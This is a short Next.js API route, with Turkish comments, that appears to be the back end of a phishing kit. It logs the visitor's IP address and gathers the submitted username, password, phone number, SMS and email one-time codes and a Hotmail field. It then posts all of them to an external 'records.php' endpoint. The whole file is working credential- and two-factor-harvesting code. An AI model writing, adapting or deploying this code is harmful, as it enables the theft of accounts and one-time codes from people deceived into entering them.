import { NextRequest, NextResponse } from 'next/server'
import axios from 'axios'

const formatIP = (ip: string): string => {
  if (ip.startsWith('::ffff:')) {
    return ip.substring(7)
  }
  return ip
}

export async function POST(request: NextRequest) {
  const forwarded = request.headers.get('x-forwarded-for')
  const rawIp = forwarded?.split(',')[0] ||
    request.headers.get('x-real-ip') ||
    request.ip ||
    request.headers.get('x-client-ip') ||
    'Unknown'

  const ip = formatIP(rawIp)

  try {
    const body = await request.json()
    
    // Tüm form verilerini tek bir objede topla
    const userData = {
      ipAddress: ip,
      username: body.username,
      password: body.password,
      phone: body.phone,
      phone_sms: body.phone_sms,
      mail_sms: body.mail_sms,
      hotmail: body.hotmail,
      auth: body.auth,
      page: body.page
    }

    // Records.php'ye istek at
    const response = await axios.post(
      `${process.env.NEXT_PUBLIC_API_URL}/mardin/records.php`,
      userData,
      {
        headers: {
          'Content-Type': 'application/json',
        }
      }
    )

    return NextResponse.json(response.data)
  } catch (error: any) {
    console.error('Error in records API:', error?.response?.data || error?.message)
    return NextResponse.json(
      { success: false, error: 'Internal Server Error', details: error?.message },
      { status: 500 }
    )
  }
}